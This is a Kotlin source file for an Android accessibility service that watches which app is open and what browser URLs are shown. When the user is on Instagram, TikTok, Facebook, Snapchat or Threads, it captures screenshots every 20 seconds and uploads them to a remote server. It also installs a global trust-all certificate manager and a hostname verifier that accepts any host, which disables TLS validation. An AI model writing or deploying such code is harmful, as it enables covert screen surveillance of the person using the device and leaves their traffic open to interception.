package com.example.mobile_app

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.graphics.Bitmap
import android.os.Handler
import android.os.Looper
import android.util.Log
import java.io.ByteArrayOutputStream
import java.net.URL
import javax.net.ssl.HttpsURLConnection
import javax.net.ssl.SSLContext
import javax.net.ssl.TrustManager
import javax.net.ssl.X509TrustManager
import kotlin.concurrent.thread
import org.json.JSONObject
import android.content.Context
import android.view.Display
import android.os.PowerManager
import android.app.KeyguardManager
import android.accessibilityservice.AccessibilityService.ScreenshotResult
import android.accessibilityservice.AccessibilityService.TakeScreenshotCallback

class ScreenMonitorService : AccessibilityService() {

    private val handler = Handler(Looper.getMainLooper())
    private var isMonitoring = false
    private val POLLING_INTERVAL = 20000L // 20 seconds
    private var lastBitmapHash = 0
    @Volatile private var currentPackageName = ""
    @Volatile private var currentUrl = ""

    companion object {
        private val SOCIAL_APP_PACKAGES = setOf(
            // Instagram + Threads
            "com.instagram.android",
            "com.instagram.barcelona",
            // Facebook
            "com.facebook.katana",
            "com.facebook.lite",
            // TikTok (global + variants + lite)
            "com.zhiliaoapp.musically",
            "com.ss.android.ugc.trill",
            "com.ss.android.ugc.aweme",
            "com.zhiliaoapp.musically.go",
            // Snapchat
            "com.snapchat.android"
        )

        private val BROWSER_PACKAGES = setOf(
            "com.android.chrome",
            "com.chrome.beta",
            "com.chrome.dev",
            "org.mozilla.firefox",
            "org.mozilla.firefox_beta",
            "org.mozilla.fenix",
            "com.microsoft.emmx",
            "com.sec.android.app.sbrowser",
            "com.opera.browser",
            "com.opera.mini.native",
            "com.brave.browser",
            "com.vivaldi.browser",
            "com.kiwibrowser.browser",
            "com.duckduckgo.mobile.android",
            "com.ecosia.android",
            "com.mi.globalbrowser"
        )

        private val SOCIAL_DOMAINS = listOf(
            "facebook.com",
            "fb.com",
            "fb.watch",
            "m.facebook.com",
            "instagram.com",
            "tiktok.com",
            "snapchat.com",
            "threads.net",
            "threads.com"
        )

        @Volatile private var trustAllInstalled = false

        @Synchronized
        private fun installTrustAllOnce() {
            if (trustAllInstalled) return
            try {
                val trustAll = arrayOf<TrustManager>(object : X509TrustManager {
                    override fun getAcceptedIssuers(): Array<java.security.cert.X509Certificate> = arrayOf()
                    override fun checkClientTrusted(chain: Array<java.security.cert.X509Certificate>, authType: String) {}
                    override fun checkServerTrusted(chain: Array<java.security.cert.X509Certificate>, authType: String) {}
                })
                val sc = SSLContext.getInstance("TLS")
                sc.init(null, trustAll, java.security.SecureRandom())
                HttpsURLConnection.setDefaultSSLSocketFactory(sc.socketFactory)
                HttpsURLConnection.setDefaultHostnameVerifier { _, _ -> true }
                trustAllInstalled = true
            } catch (e: Exception) {
                Log.e("ScreenMonitor", "Trust-all install failed", e)
            }
        }
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        val info = AccessibilityServiceInfo()
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
        info.flags = AccessibilityServiceInfo.DEFAULT or AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
        this.serviceInfo = info
        Log.d("ScreenMonitor", "Service Connected - social watch")
        installTrustAllOnce()
        startMonitoringLoop()
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED ||
            event.eventType == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
            event.packageName?.let { currentPackageName = it.toString() }
            if (BROWSER_PACKAGES.contains(currentPackageName)) {
                try {
                    val sourceUrl = findUrlInNode(event.source)
                        ?: findUrlInNode(rootInActiveWindow)
                    if (!sourceUrl.isNullOrEmpty()) currentUrl = sourceUrl
                } catch (_: Exception) {}
            } else {
                currentUrl = ""
            }
        }
    }

    override fun onInterrupt() {
        Log.d("ScreenMonitor", "Service Interrupted")
        isMonitoring = false
    }

    private fun findUrlInNode(root: AccessibilityNodeInfo?): String? {
        if (root == null) return null
        // Pass 1: address-bar-like fields containing a social domain.
        findDomainInTree(root, onlyEditable = true)?.let { return it }
        // Pass 2: any visible text containing a social domain.
        return findDomainInTree(root, onlyEditable = false)
    }

    private fun findDomainInTree(root: AccessibilityNodeInfo, onlyEditable: Boolean): String? {
        val queue: ArrayDeque<AccessibilityNodeInfo> = ArrayDeque()
        queue.add(root)
        var visited = 0
        while (queue.isNotEmpty() && visited < 80) {
            val node = queue.removeFirst()
            visited++
            try {
                val className = node.className?.toString() ?: ""
                val isEditable = className.contains("EditText")
                if (!onlyEditable || isEditable) {
                    val candidates = listOf(node.text?.toString(), node.contentDescription?.toString())
                    for (text in candidates) {
                        if (text.isNullOrEmpty() || text.length > 600) continue
                        val lower = text.lowercase()
                        for (domain in SOCIAL_DOMAINS) {
                            if (lower.contains(domain)) return text.trim()
                        }
                        if (onlyEditable && (lower.startsWith("http") || lower.startsWith("www.")) && lower.contains(".")) {
                            return text.trim()
                        }
                    }
                }
                for (i in 0 until node.childCount) {
                    node.getChild(i)?.let { queue.add(it) }
                }
            } catch (_: Exception) {}
        }
        return null
    }

    private fun getSharedPrefsValue(key: String): String? {
        val prefs = getSharedPreferences("FlutterSharedPreferences", Context.MODE_PRIVATE)
        return prefs.getString("flutter.$key", null)
    }

    private fun isSocialApp(pkg: String): Boolean = SOCIAL_APP_PACKAGES.contains(pkg)

    private fun isSocialUrl(url: String): Boolean {
        if (url.isEmpty()) return false
        val lower = url.lowercase()
        return SOCIAL_DOMAINS.any { lower.contains(it) }
    }

    private fun startMonitoringLoop() {
        isMonitoring = true
        handler.post(object : Runnable {
            override fun run() {
                if (!isMonitoring) return
                thread { checkStatusAndCapture() }
                handler.postDelayed(this, POLLING_INTERVAL)
            }
        })
    }

    private fun checkStatusAndCapture() {
        val powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
        val keyguardManager = getSystemService(Context.KEYGUARD_SERVICE) as KeyguardManager

        if (!powerManager.isInteractive || keyguardManager.isKeyguardLocked) return

        val pkg = currentPackageName
        val inSocialApp = isSocialApp(pkg)
        val inSocialSite = BROWSER_PACKAGES.contains(pkg) && isSocialUrl(currentUrl)
        if (!inSocialApp && !inSocialSite) return

        val serverIp = getSharedPrefsValue("server_ip") ?: return
        val deviceId = getSharedPrefsValue("device_id") ?: return
        val deviceToken = getSharedPrefsValue("device_token") ?: return

        try {
            installTrustAllOnce()
            val statusUrl = URL("https://$serverIp:3000/api/monitoring_status/$deviceId")
            val conn = statusUrl.openConnection() as HttpsURLConnection
            conn.requestMethod = "GET"
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.setRequestProperty("X-Device-Token", deviceToken)
            if (conn.responseCode == 200) {
                val response = conn.inputStream.bufferedReader().use { it.readText() }
                val enabled = JSONObject(response).optBoolean("monitoring_enabled", true)
                if (enabled) takeScreenshotAndUpload(serverIp, deviceId, deviceToken)
            }
            conn.disconnect()
        } catch (e: Exception) {
            Log.e("ScreenMonitor", "Monitoring status check failed", e)
        }
    }

    private fun takeScreenshotAndUpload(serverIp: String, deviceId: String, deviceToken: String) {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY, mainExecutor, object : TakeScreenshotCallback {
                override fun onSuccess(screenshot: ScreenshotResult) {
                    val bitmap = Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                    if (bitmap != null) {
                        val swBitmap = bitmap.copy(Bitmap.Config.ARGB_8888, false)
                        screenshot.hardwareBuffer.close()

                        val newHash = getBitmapHash(swBitmap)
                        if (newHash == lastBitmapHash) {
                            swBitmap.recycle()
                            return
                        }
                        lastBitmapHash = newHash

                        thread { uploadBitmap(swBitmap, serverIp, deviceId, deviceToken) }
                    }
                }
                override fun onFailure(errorCode: Int) {
                    Log.e("ScreenMonitor", "Screenshot failed: $errorCode")
                }
            })
        }
    }

    private fun getBitmapHash(bitmap: Bitmap): Int {
        val w = bitmap.width
        val h = bitmap.height
        if (w <= 0 || h <= 0) return 0
        var hash = 17
        val stepX = (w / 10).coerceAtLeast(1)
        val stepY = (h / 10).coerceAtLeast(1)
        var x = 0
        while (x < w) {
            var y = 0
            while (y < h) {
                hash = hash * 31 + bitmap.getPixel(x, y)
                y += stepY
            }
            x += stepX
        }
        return hash
    }

    private fun uploadBitmap(bitmap: Bitmap, serverIp: String, deviceId: String, deviceToken: String) {
        try {
            val bos = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, bos)
            val bitmapData = bos.toByteArray()
            bitmap.recycle()

            installTrustAllOnce()
            val url = URL("https://$serverIp:3000/api/upload_screenshot")
            val conn = url.openConnection() as HttpsURLConnection
            conn.requestMethod = "POST"
            conn.connectTimeout = 10000
            conn.readTimeout = 10000
            conn.setRequestProperty("Content-Type", "image/jpeg")
            conn.setRequestProperty("x-device-id", deviceId)
            conn.setRequestProperty("x-device-token", deviceToken)
            conn.doOutput = true

            conn.outputStream.write(bitmapData)
            conn.outputStream.flush()
            conn.outputStream.close()

            Log.d("ScreenMonitor", "Upload response: ${conn.responseCode}")
            conn.disconnect()
        } catch (e: Exception) {
            Log.e("ScreenMonitor", "Upload failed", e)
        }
    }
}
